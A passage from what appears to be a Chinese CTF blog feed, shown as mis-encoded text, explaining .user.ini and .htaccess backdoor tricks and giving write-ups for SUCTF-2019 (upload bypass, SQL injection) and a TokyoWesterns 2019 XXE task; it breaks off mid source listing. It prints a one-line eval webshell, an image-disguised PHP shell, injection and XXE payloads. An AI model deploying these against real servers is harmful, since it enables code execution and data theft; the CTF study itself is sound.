è®¾ç½®å¯è¢«è¯†åˆ«ã€‚</p><p>ä¸¤ä¸ªæ–°çš„ INI æŒ‡ä»¤ï¼Œuser_ini.filename å’Œ user_ini.cache_ttl æ§åˆ¶ç€ç”¨æˆ· INI æ–‡ä»¶çš„ä½¿ç”¨ã€‚</p><p>user_ini.filename è®¾å®šäº† PHP ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æœå¯»çš„æ–‡ä»¶åï¼›å¦‚æœè®¾å®šä¸ºç©ºå­—ç¬¦ä¸²åˆ™ PHP ä¸ä¼šæœå¯»ã€‚é»˜è®¤å€¼æ˜¯ .user.iniã€‚</p><p>user_ini.cache_ttl æ§åˆ¶ç€é‡æ–°è¯»å–ç”¨æˆ· INI æ–‡ä»¶çš„é—´éš”æ—¶é—´ã€‚é»˜è®¤æ˜¯ 300 ç§’ï¼ˆ5 åˆ†é’Ÿï¼‰ã€‚</p></blockquote><p>åŒæ—¶ä¸php.iniä¸åŒçš„æ˜¯.user.iniæ˜¯ä¸€ä¸ªèƒ½åŠ¨æ€åŠ è½½çš„é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹æ–‡ä»¶å†…å®¹ä¹‹åä¸éœ€è¦é‡å¯ä¸­é—´ä»¶åªéœ€è¦ç­‰å¾…  <code>user_ini.cache_ttl</code> æ—¶é—´å³å¯è¢«åŠ è½½ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ <code>.user.ini</code> å…¶å®å°±æ˜¯ä¸€ä¸ªæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰phpé…ç½®çš„æ–‡ä»¶ã€‚</p><h3 id="å¦‚ä½•åˆ©ç”¨ï¼Ÿ"><a href="#å¦‚ä½•åˆ©ç”¨ï¼Ÿ" class="headerlink" title="å¦‚ä½•åˆ©ç”¨ï¼Ÿ"></a>å¦‚ä½•åˆ©ç”¨ï¼Ÿ</h3><p>ä»phpé…ç½®åˆ—è¡¨é‡Œæˆ‘ä»¬å‘ç°æ— æ³•é…ç½®ä¸€äº›å…³é”®çš„é…ç½®ï¼Œä½†æ˜¯åœ¨æ„æˆæ–‡ä»¶åé—¨æ—¶æˆ‘ä»¬æ‰¾åˆ°äº†ä¸¤ä¸ªæˆ‘ä»¬å¯ä»¥è‡ªå·±é…ç½®çš„é€‰é¡¹ï¼š</p><p><img src="https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png" alt></p><p><strong>auto_prepend_file</strong></p><blockquote><p>Specifies the name of a file that is automatically parsed before the main file. The file is included as if it was called with the require function, so include_path is used.</p><p>The special value none disables auto-prepending.</p></blockquote><p>æŒ‡å®šä¸€ä¸ªæ–‡ä»¶åœ¨ä¸»æ–‡ä»¶ä¹‹å‰è‡ªåŠ¨è§£æï¼Œè¿™ä¸ªè¢«åŒ…å«çš„æ–‡ä»¶ç›¸å½“äºåœ¨ä¸»æ–‡ä»¶ä¹‹å‰è°ƒç”¨äº† <code>require</code> å‡½æ•°ï¼Œè·¯å¾„å—åˆ°<code>include_path</code> é™åˆ¶ã€‚ <code>include_path</code> ä¼šæŒ‡å®š <em>require, include, fopen(), file(), readfile() and file_get_contents()</em> è¿™äº›å‡½æ•°æ‰§è¡Œæ—¶å»å“ªå¯»æ‰¾æ–‡ä»¶ã€‚</p><p><strong>auto_append_file</strong></p><blockquote><p>Specifies the name of a file that is automatically parsed after the main file. The file is included as if it was called with the require function, so include_path is used.</p><p>The special value none disables auto-appending.</p><p>Note: If the script is terminated with exit(), auto-append will not occur.</p></blockquote><p>æˆ‘ä»¬åˆ©ç”¨çš„é‡ç‚¹æ˜¯ç¬¬ä¸€ä¸ªé…ç½®ï¼ŒåŒæ—¶æˆ‘ä»¬ä»æ–‡æ¡£ä¹Ÿå¯ä»¥çœ‹å‡ºåœ¨åˆ©ç”¨æ—¶æˆ‘ä»¬éœ€è¦ä¸€ä¸ª<strong>æ­£å¸¸</strong>çš„phpæ–‡ä»¶æ¥åŒ…å«æˆ‘ä»¬çš„webshellï¼Œ*<em>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªæœ‰åœ¨æ–‡ä»¶å¤¹é‡Œæœ‰å¯ä»¥æ­£å¸¸è§£æ(ä½¿ç”¨fastcgiæ¨¡å¼è§£æ)çš„phpæ–‡ä»¶æ—¶æ‰èƒ½è¿™æ ·åˆ©ç”¨ã€‚<br>*</em><br>ä½¿ç”¨æ—¶ä¹Ÿç®€å•ç›´æ¥å†™åœ¨<code>.user.ini</code>ä¸­</p><pre><code>auto_prepend_file=webshell.jpg</code></pre><h3 id="æ•ˆæœå¦‚ä½•ï¼Ÿ"><a href="#æ•ˆæœå¦‚ä½•ï¼Ÿ" class="headerlink" title="æ•ˆæœå¦‚ä½•ï¼Ÿ"></a>æ•ˆæœå¦‚ä½•ï¼Ÿ</h3><p>ç¯å¢ƒwin10+php-5.45-nts+Nginx</p><p>ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1g7c0otmfxdj313c0f476s.jpg" alt="æ•ˆæœå¦‚å›¾"></p><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><h3 id="htaccessæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#htaccessæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title=".htaccessæ˜¯ä»€ä¹ˆï¼Ÿ"></a>.htaccessæ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>ç¿»é˜…apacehå®˜æ–¹æ–‡æ¡£<a href="https://httpd.apache.org/docs/current/howto/htaccess.html" target="_blank" rel="noopener">https://httpd.apache.org/docs/current/howto/htaccess.html</a>å¯çŸ¥</p><blockquote><p>.htaccess files provide a way to make configuration changes on a per-directory basis.</p></blockquote><p><code>.htaccess</code> æ–‡ä»¶æä¾›äº†ä¸€ç§ç›®å½•çº§åˆ«çš„ä¿®æ”¹é…ç½®çš„æ–¹å¼ã€‚ä¸€ä¸ªæ–‡ä»¶ï¼ŒåŒ…å«ä¸€æ¡æˆ–å¤šæ¡é…ç½®æŒ‡ä»¤ï¼Œæ”¾ç½®äºç›®å½•ä¸‹ï¼Œè¿™äº›é…ç½®æŒ‡ä»¤å¯¹å½“å‰ç›®å½•å’Œå…¶æ‰€æœ‰å­ç›®å½•ç”Ÿæ•ˆã€‚</p><h3 id="SetHandler"><a href="#SetHandler" class="headerlink" title="SetHandler"></a>SetHandler</h3><p>æˆ‘ä»¬åœ¨ <code>.htaccess</code> æ–‡ä»¶ä¸­å¯ä»¥é€šè¿‡å¢åŠ  <code>handler-name</code> æ¥é…ç½®æ–‡ä»¶çš„è§£ææ–¹å¼ã€‚æ¯”å¦‚ä½ æœ‰ä¸€ä¸ªç›®å½•ï¼Œä½ æƒ³è®©å®ƒè¢« <code>imagemap rule files</code> è§£æï¼Œä½ å¯ä»¥åœ¨åœ¨ <code>.htaccess</code> æ–‡ä»¶ä¸­åŠ å…¥è¿™æ®µä»£ç ï¼š</p><pre><code>SetHandler imap-file</code></pre><p>åŒæ ·çš„ï¼Œ<code>AddType</code> å¯æŒ‡ç¤ºæ–‡ä»¶ç®¡ç†ç³»ç»Ÿå¯¹ç»™å‡ºçš„æ–‡ä»¶åä»¥é€‰å®šçš„æ–‡ä»¶ç±»å‹è¿›è¡Œè§£æã€‚</p><pre><code>AddType image/gif .gif</code></pre><p>åŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨ä»¥ <code>php</code> ä½œä¸º <code>Apacec module</code> æ—¶ï¼Œé€šè¿‡ <code>php_value</code> æ¥é…ç½®PHPçš„é…ç½®é€‰é¡¹ï¼š</p><pre><code>php_value name value</code></pre><p>è®¾ç½®æŒ‡å®šçš„å€¼. åªé€‚åˆäº PHP_INI_ALL å’Œ PHP_INI_PERDIR ç±»å‹æŒ‡ä»¤</p><h3 id="å¦‚ä½•åˆ©ç”¨ï¼Ÿ-1"><a href="#å¦‚ä½•åˆ©ç”¨ï¼Ÿ-1" class="headerlink" title="å¦‚ä½•åˆ©ç”¨ï¼Ÿ"></a>å¦‚ä½•åˆ©ç”¨ï¼Ÿ</h3><p><strong>æ–‡ä»¶è§£æä¸Šä¼ æ¼æ´</strong></p><p>.htaccessæ–‡ä»¶ä¸­å®šä¹‰äº†å°†ä¸Šä¼ çš„æ–‡ä»¶åç¼€åä¸º .jpg æ ¼å¼çš„æ–‡ä»¶ä»¥ php æ ¼å¼æ¥è§£ææ–‡ä»¶ã€‚.htaccess æ˜¯apacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œä¸æ˜¯ä¸Šä¼ çš„æ–‡ä»¶çš„é»‘åå•ä¹‹å†…ï¼Œæ‰€ä»¥è¯¥ç±»å‹æ–‡ä»¶å¯ä»¥ä¸Šä¼ æˆåŠŸã€‚</p><pre><code>AddType  application/x-httpd-php  .jpg</code></pre><p>è¿˜å¯ä»¥è¿™æ ·ï¼š</p><pre><code># FileMatch å‚æ•°å³ä¸ºæ–‡ä»¶åçš„æ­£åˆ™åŒ¹é…&lt;FilesMatch &quot;sniperoj&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;// sniperoj&lt;?php eval($_GET[&apos;c&apos;]);?&gt;</code></pre><p><strong>æ–‡ä»¶åŒ…å«</strong></p><pre><code>index.php: (empty).htaccess:php_value auto_append_file /etc/hosts</code></pre><p><strong>PHP ä»£ç æ‰§è¡Œ</strong></p><pre><code>index.php: (empty).htaccess:php_value auto_append_file .htaccess#&lt;?php phpinfo();</code></pre><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><blockquote><p><a href="https://httpd.apache.org/docs/current/howto/htaccess.html" target="_blank" rel="noopener">https://httpd.apache.org/docs/current/howto/htaccess.html</a></p><p><a href="http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html" target="_blank" rel="noopener">http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html</a></p><p><a href="https://httpd.apache.org/docs/current/mod/mod_authn_core.html#authtype" target="_blank" rel="noopener">https://httpd.apache.org/docs/current/mod/mod_authn_core.html#authtype</a></p><p><a href="https://httpd.apache.org/docs/current/mod/core.html#sethandler" target="_blank" rel="noopener">https://httpd.apache.org/docs/current/mod/core.html#sethandler</a></p><p><a href="https://httpd.apache.org/docs/current/mod/mod_mime.html#addhandler" target="_blank" rel="noopener">https://httpd.apache.org/docs/current/mod/mod_mime.html#addhandler</a></p><p><a href="https://www.php.net/manual/en/configuration.changes.php" target="_blank" rel="noopener">https://www.php.net/manual/en/configuration.changes.php</a></p><p><a href="https://www.cnblogs.com/xia0zhiwei/p/4713438.html" target="_blank" rel="noopener">https://www.cnblogs.com/xia0zhiwei/p/4713438.html</a></p><p><a href="http://www.vuln.cn/6001" target="_blank" rel="noopener">http://www.vuln.cn/6001</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF-2019</title>
      <link href="/2019/09/10/suctf-2019-WP/"/>
      <url>/2019/09/10/suctf-2019-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="SUCTF-2019-WP"><a href="#SUCTF-2019-WP" class="headerlink" title="SUCTF-2019 WP"></a>SUCTF-2019 WP</h1><p>9/10/2019 6:15:38 PM </p><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>å…ˆä¸Šä¼ ä¸€ä¸ª <code>websell.php</code>ï¼Œæ˜¾ç¤ºåç¼€ä¸åˆæ³•(æ”¹<code>php5</code>ã€<code>php4</code>ã€<code>content-type</code>è¿™äº›éƒ½ä¸è¡Œ)ã€‚</p><p>å†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬å‘ç°æ˜¾ç¤º <code>&amp;lt;? in contents!</code> ï¼Œå°±æ˜¯è¯´<code>&lt; ?</code>ä¸èƒ½è¿ç»­å­˜åœ¨ã€‚</p><p>æˆ‘ä»¬é€šè¿‡<code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code>æ¥ç»•è¿‡å¯¹<code>&lt;?</code>çš„æ£€æµ‹ã€‚è¿™æ¬¡æˆ‘ä»¬å¾—åˆ°å›æ˜¾<br>    exif_imagetype:not image!</p><p><code>exif_imagetype</code>ç”¨æ¥åˆ¤æ–­å›¾ç‰‡ç±»å‹ï¼Œä»–è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚åªè¦æˆ‘ä»¬æ·»åŠ ä¸€ä¸ªå›¾ç‰‡å¤´å°±å¯ä»¥ç»•è¿‡ï¼Œæ¯”å¦‚æ·»åŠ <code>GIF89a</code>.åœ¨æ·»åŠ å®Œä¹‹åæˆ‘ä»¬ä¸Šä¼ æˆåŠŸï¼Œæ­¤æ—¶çš„æ–‡ä»¶ç›®å½•ä¸‹é™¤äº†æˆ‘ä»¬ä¸Šä¼ çš„<code>webshell</code>è¿˜æœ‰ä¸€ä¸ª<code>index.php</code>.</p><h3 id="user-ini-æ–‡ä»¶æ„æˆçš„åé—¨"><a href="#user-ini-æ–‡ä»¶æ„æˆçš„åé—¨" class="headerlink" title=".user.ini æ–‡ä»¶æ„æˆçš„åé—¨"></a>.user.ini æ–‡ä»¶æ„æˆçš„åé—¨</h3><p>è¯¦æƒ…çœ‹pç¥è¿™ç¯‡æ–‡ç« <a href="http://www.vuln.cn/6001" title="ç‚¹è¿™é‡Œ" target="_blank" rel="noopener">http://www.vuln.cn/6001</a></p><blockquote><p>é™¤äº†ä¸» php.ini ä¹‹å¤–ï¼ŒPHP è¿˜ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æ‰«æ INI æ–‡ä»¶ï¼Œä»è¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶æ‰€åœ¨ç›®å½•å¼€å§‹ä¸€ç›´ä¸Šå‡åˆ° web æ ¹ç›®å½•ï¼ˆ$_SERVER[â€˜DOCUMENT_ROOTâ€™] æ‰€æŒ‡å®šçš„ï¼‰ã€‚å¦‚æœè¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶åœ¨ web æ ¹ç›®å½•ä¹‹å¤–ï¼Œåˆ™åªæ‰«æè¯¥ç›®å½•ã€‚</p></blockquote><blockquote><p>åœ¨ .user.ini é£æ ¼çš„ INI æ–‡ä»¶ä¸­åªæœ‰å…·æœ‰ PHP_INI_PERDIR å’Œ PHP_INI_USER æ¨¡å¼çš„ INI è®¾ç½®å¯è¢«è¯†åˆ«ã€‚</p></blockquote><p><code>.user.ini</code>ç±»ä¼¼ä¸€ä¸ªç”¨æˆ·è‡ªå®šä¹‰çš„<code>php.ini</code>ã€‚æˆ‘ä»¬èƒ½å¤Ÿè‡ªå®šä¹‰çš„è®¾ç½®æ˜¯â€<code>PHP_INI_PERDIR</code> ã€ <code>PHP_INI_USER</code>â€œçš„è®¾ç½®ã€‚ï¼ˆä¸Šé¢è¡¨æ ¼ä¸­æ²¡æœ‰æåˆ°çš„<code>PHP_INI_PERDIR</code>ä¹Ÿå¯ä»¥åœ¨<code>.user.ini</code>ä¸­è®¾ç½®ï¼‰</p><p>å®é™…ä¸Šï¼Œé™¤äº†<code>PHP_INI_SYSTEM</code>ä»¥å¤–çš„æ¨¡å¼ï¼ˆåŒ…æ‹¬<code>PHP_INI_ALL</code>ï¼‰éƒ½æ˜¯å¯ä»¥é€šè¿‡<code>.user.ini</code>æ¥è®¾ç½®çš„ã€‚</p><p>å’Œ<code>php.ini</code>ä¸åŒçš„æ˜¯ï¼Œ<code>.user.ini</code>æ˜¯ä¸€ä¸ªèƒ½è¢«åŠ¨æ€åŠ è½½çš„iniæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä¿®æ”¹äº†<code>.user.ini</code>åï¼Œä¸éœ€è¦é‡å¯æœåŠ¡å™¨ä¸­é—´ä»¶ï¼Œåªéœ€è¦ç­‰å¾…<code>user_ini.cache_ttl</code>æ‰€è®¾ç½®çš„æ—¶é—´ï¼ˆé»˜è®¤ä¸º300ç§’ï¼‰ï¼Œå³å¯è¢«é‡æ–°åŠ è½½ã€‚</p><p><img src="https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png" alt="phpä¸­ä¸¤ä¸ªé…ç½®"></p><p><code>auto_prepend_file</code> æ„å‘³è¿™æ˜¯åœ¨phpè„šæœ¬æ‰§è¡Œå‰ä¼šæ‰§è¡Œè¿™ä¸ªå‚æ•°è®¾ç½®çš„è„šæœ¬ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨<code>require()</code>ç„¶åè¿™ä¸ªå‚æ•°çš„è„šæœ¬æ‰€åœ¨ç›®å½•å—<code>include_path</code>é™åˆ¶<br><code>append</code>æ˜¯åœ¨<code>php</code>è„šæœ¬æ‰§è¡Œåæ‰æ‰§è¡Œçš„ï¼Œä½†æ˜¯è¦æ³¨æ„çš„æ˜¯é‡åˆ°<code>exit()</code>çš„æ—¶å€™ï¼Œè¿™ä¸ªè„šæœ¬ä¹Ÿä¸èƒ½è¿è¡Œ</p><p>ä½¿ç”¨çš„æ—¶å€™ç›´æ¥å†™åœ¨<code>.user.ini</code>ä¸­</p><pre><code>auto_prepend_file=webshell.gif</code></pre><p>webshell.gifæ˜¯è¦åŒ…å«çš„æ–‡ä»¶.æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å€ŸåŠ©è¿™ä¸ªé…ç½®é¡¹æ¥è®©æ‰€æœ‰çš„phpæ–‡ä»¶éƒ½â€œè‡ªåŠ¨â€åŒ…å«è¿™ä¸ªæ–‡ä»¶ã€‚ğŸ‘</p><p>æŸç½‘ç«™é™åˆ¶ä¸å…è®¸ä¸Šä¼ .phpæ–‡ä»¶ï¼Œä½ ä¾¿å¯ä»¥ä¸Šä¼ ä¸€ä¸ª.user.iniï¼Œå†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼ŒåŒ…å«èµ·æ¥è¿›è¡Œgetshellã€‚ä¸è¿‡å‰ææ˜¯å«æœ‰.user.iniçš„æ–‡ä»¶å¤¹ä¸‹éœ€è¦æœ‰æ­£å¸¸çš„phpæ–‡ä»¶ï¼Œå¦åˆ™ä¹Ÿä¸èƒ½åŒ…å«äº†ã€‚</p><p>.htaccessæ–‡ä»¶æ„æˆçš„åé—¨çœ‹è¿™é‡Œï¼š<a href="https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet" title=".htaccess">https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet</a>è¿™ä¸ªåªèƒ½ç”¨äºApache</p><p>çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬å‘ç°å½“å‰ç›®å½•ä¸‹ç¡®å®æœ‰<code>index.php</code>å¯ä»¥åˆ©ç”¨ï¼Œäºæ˜¯æˆ‘ä»¬å¼€å§‹å§ğŸˆ</p><h3 id="å¼€å§‹ä¸Šä¼ "><a href="#å¼€å§‹ä¸Šä¼ " class="headerlink" title="å¼€å§‹ä¸Šä¼ "></a>å¼€å§‹ä¸Šä¼ </h3><p>æˆ‘ä»¬å…ˆæ„é€ <code>.user.ini</code>æ–‡ä»¶</p><pre><code>GIF89aauto_prepend_file=CK.jpg</code></pre><p>ç„¶åå°†å…¶ä¸Šä¼ </p><p>æ¥ç€æ„é€ å›¾ç‰‡é©¬<code>CK.jpg</code></p><pre><code>GIF89a&lt;script language=&apos;php&apos;&gt;    system(&apos;cat /flag&apos;);&lt;/script&gt;</code></pre><p>æˆåŠŸä¸Šä¼ ä¹‹åæˆ‘ä»¬è®¿é—®ä¸Šä¼ åçš„é¡µé¢å³å¯çœ‹åˆ°flagã€‚</p><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy sql"></a>easy sql</h2><p>å­˜åœ¨å †å æ³¨å…¥ï¼Œæµ‹è¯•<code>1;show tables;</code>å›æ˜¾</p><pre><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag ) </code></pre><p>æµ‹è¯•<code>1;select * from Flag;</code>,flagè¢«è¿‡æ»¤äº†</p><p><code>.index.php.swp</code>å­˜åœ¨æºç æ³„éœ²,æºç å¦‚ä¸‹  </p><pre><code>&lt;?php    session_start();    include_once &quot;config.php&quot;;    $post = array();    $get = array();    global $MysqlLink;    //GetPara();    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);    if(!$MysqlLink){        die(&quot;Mysql Connect Error!&quot;);    }    $selectDB = mysqli_select_db($MysqlLink,$dataName);    if(!$selectDB){        die(&quot;Choose Database Error!&quot;);    }    foreach ($_POST as $k=&gt;$v){        if(!empty($v)&amp;&amp;is_string($v)){            $post[$k] = trim(addslashes($v));        }    }    foreach ($_GET as $k=&gt;$v){        }    }    //die();    ?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php    if(isset($post[&apos;query&apos;])){        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;        //var_dump(preg_match(&quot;/{$BlackList}/is&quot;,$post[&apos;query&apos;]));        if(preg_match(&quot;/{$BlackList}/is&quot;,$post[&apos;query&apos;])){            //echo $post[&apos;query&apos;];            die(&quot;Nonono.&quot;);        }        if(strlen($post[&apos;query&apos;])&gt;40){            die(&quot;Too long.&quot;);        }        $sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;        mysqli_multi_query($MysqlLink,$sql);        do{            if($res = mysqli_store_result($MysqlLink)){                while($row = mysqli_fetch_row($res)){                    print_r($row);                }            }        }while(@mysqli_next_result($MysqlLink));    }    ?&gt;</code></pre><p>æŸ¥è¯¢è¯­å¥ä¸ºï¼š<code>$sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code></p><h3 id="logical-OR"><a href="#logical-OR" class="headerlink" title="|| logical OR"></a>|| logical OR</h3><pre><code>mysql&gt; SELECT 1 OR 1;        -&gt; 1mysql&gt; SELECT 1 OR 0;        -&gt; 1mysql&gt; SELECT 0 OR 0;        -&gt; 0mysql&gt; SELECT 0 OR NULL;        -&gt; NULLmysql&gt; SELECT 1 OR NULL;        -&gt; 1</code></pre><blockquote><p>Logical OR. When both operands are non-NULL, the result is 1 if any operand is nonzero, and 0 otherwise. With a NULL operand, the result is 1 if the other operand is nonzero, and NULL otherwise. If both operands are NULL, the result is NULL. </p></blockquote><h3 id="å¦‚ä½•åšï¼Ÿ"><a href="#å¦‚ä½•åšï¼Ÿ" class="headerlink" title="å¦‚ä½•åšï¼Ÿ"></a>å¦‚ä½•åšï¼Ÿ</h3><p>å…ˆæ¥çœ‹ä¸€ä¸ªmsqlçš„é…ç½®</p><p><strong>PIPES_AS_CONCAT</strong></p><blockquote><p>Treat || as a string concatenation operator (same as CONCAT()) rather than as a synonym for OR. </p></blockquote><p>å¦‚æœé…ç½®äº†<code>sql_mode=PIPES_AS_CONCAT</code>ï¼ŒMysqlä¼šæŠŠé€»è¾‘æˆ–å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²é“¾æ¥å‡½æ•°å¯¹å¾…ã€‚  </p><p><strong>CONCAT(str1,str2,â€¦)</strong></p><blockquote><p>Returns the string that results from concatenating the arguments. May have one or more arguments. If all arguments are nonbinary strings, the result is a nonbinary string. If the arguments include any binary strings, the result is a binary string. A numeric argument is converted to its equivalent nonbinary string form. </p></blockquote><p><code>CONCAT()</code> returns NULL if any argument is NULL. </p><pre><code>mysql&gt; SELECT CONCAT(&apos;My&apos;, &apos;S&apos;, &apos;QL&apos;);        -&gt; &apos;MySQL&apos;mysql&gt; SELECT CONCAT(&apos;My&apos;, NULL, &apos;QL&apos;);        -&gt; NULLmysql&gt; SELECT CONCAT(14.3);        -&gt; &apos;14.3&apos;</code></pre><p>æˆ‘ä»¬é€šè¿‡<code>sql_mode=PIPES_AS_CONCAT</code>æ¥å°†flagå¸¦å‡ºæ¥</p><p>payload:  <code>1;sql_mode=PIPES_AS_CONCAT;select 1</code>  </p><p>è¯­å¥ä¸º:</p><pre><code>select 1;sql_mode=PIPES_AS_CONCAT;select 1;|| flag rom Flag;</code></pre><h3 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h3><p>payload:<code>*,1</code>æ„é€ <code>select *,1 || flag from Flag;</code> å³å¯æŸ¥å‡ºå…¨éƒ¨å†…å®¹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TokyoWestern 2019</title>
      <link href="/2019/09/05/TokyoWesterns-2019/"/>
      <url>/2019/09/05/TokyoWesterns-2019/</url>
      
        <content type="html"><![CDATA[<h1 id="TokyoWestern-2019"><a href="#TokyoWestern-2019" class="headerlink" title="TokyoWestern 2019"></a>TokyoWestern 2019</h1><p>9/5/2019 5:20:26 PM ğŸ¨</p><h2 id="ji2xji2"><a href="#ji2xji2" class="headerlink" title="ji2xji2"></a>ji2xji2</h2><p>æ‹¿åˆ°é¢˜ç›®ç¬¬ä¸€ååº”å°±æ˜¯XXEï¼Œç›´æ¥æ‹¿ç€ä¹‹å‰åšå®¢çš„payloadä¸€é¡¿è¯•ï¼Œç»“æœå¾—åˆ°äº†<code>failed to decode xml</code>ï¼Œç„¶åå°±åœ¨æƒ³æ˜¯ä¸æ˜¯æ€è·¯é”™äº†ï¼Œæ²¡æƒ³åˆ°æ˜¯è¯»çš„æ–‡ä»¶ä¸å­˜åœ¨ï¼Œå…¶å®æ‹¿æœ€ç®€å•çš„</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p>å°±èƒ½çœ‹å‡ºæ¥å¯ä»¥è§£æï¼Œå› ä¸ºè§‰å¾—ä¸å¯èƒ½è¿™ä¹ˆç®€å•å°±æ²¡æœ‰è¯•â€¦</p><p>è¯»æºç </p><pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;&lt;!DOCTYPE mail[&lt;!ENTITY hacker SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;]&gt;&lt;mail&gt;    &lt;message&gt;&amp;hacker;&lt;/message&gt;&lt;/mail&gt;</code></pre><p>è¿™é‡Œæˆ‘ä»¬è¦æ³¨æ„å¾—åˆ°çš„åŠ å¯†åçš„æ•°æ®åœ¨å“ªé‡Œç»“æŸ</p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g6vh6cdqqvj31d60dmwj2.jpg" alt="è¯»æºç "></p><p>å¾—åˆ°æºç ï¼Œä»ç¬¬ä¸€å¥å¾—åˆ°<strong>flag</strong>çš„ä½ç½®</p><pre><code>&lt;?php**include &apos;flag.php&apos;;**$method = $_SERVER[&apos;REQUEST_METHOD&apos;];function die404($msg) {  http_response_code(404);  die($msg);}function check_type($obj) {  if (is_array($obj)) {    $key_is_str = function($obj) {      foreach($obj as $key=&gt;$val) {        if (is_int($key))          return false;      }      return true;    };    if ($key_is_str($obj)) {      return &apos;object&apos;;    }    else {      return &apos;array&apos;;    }  }  else {    return gettype($obj);  }}function json2xml($obj) {  $res = &apos;&apos;;  if (is_array($obj)) {    foreach($obj as $key =&gt; $val) {      switch(check_type($val)) {        case &apos;array&apos;:          foreach($val as $v) {            $res .= &quot;&lt;$key&gt;&quot;;            $res .= json2xml($v);            $res .= &quot;&lt;/$key&gt;&quot;;          }          break;        default: // object or primitive          $res .= &quot;&lt;$key&gt;&quot;;          $res .= json2xml($val);          $res .= &quot;&lt;/$key&gt;&quot;;          break;      }    }  }  else {    $res = (string)$obj;  }  return $res;}if ($method === &apos;POST&apos;) {  $jsonstr = $_POST[&apos;json&apos;];  $xmlstr = $_POST[&apos;xml&apos;];  if (!(empty($xmlstr) ^ empty($jsonstr))) {    die404(&apos;404&apos;);  }  if (!empty($jsonstr)) {    $obj = json_decode($jsonstr, true);    if (empty($obj)) {      die(&apos;failed to decode json&apos;);    }    $doc = new DOMDocument(&apos;1.0&apos;);    $doc-&gt;formatOutput = true;    $_obj = array();    $_obj[&apos;root&apos;] = $obj;    $doc-&gt;loadXML(json2xml($_obj));    echo $doc-&gt;saveXML();  }  if (!empty($xmlstr)) {    libxml_disable_entity_loader(false);    $obj = simplexml_load_string($xmlstr, &apos;SimpleXMLElement&apos;, LIBXML_NOENT);    if (empty($obj)) {      die(&apos;failed to decode xml&apos;);    }    echo json_encode($obj, JSON_PRETTY_PRINT);  }}else {?&gt;&lt;!doctype html&gt;&lt;html&gt;  &lt;head&gt;    &lt;title&gt;JSON &lt;-&gt; XML Converter&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;textarea 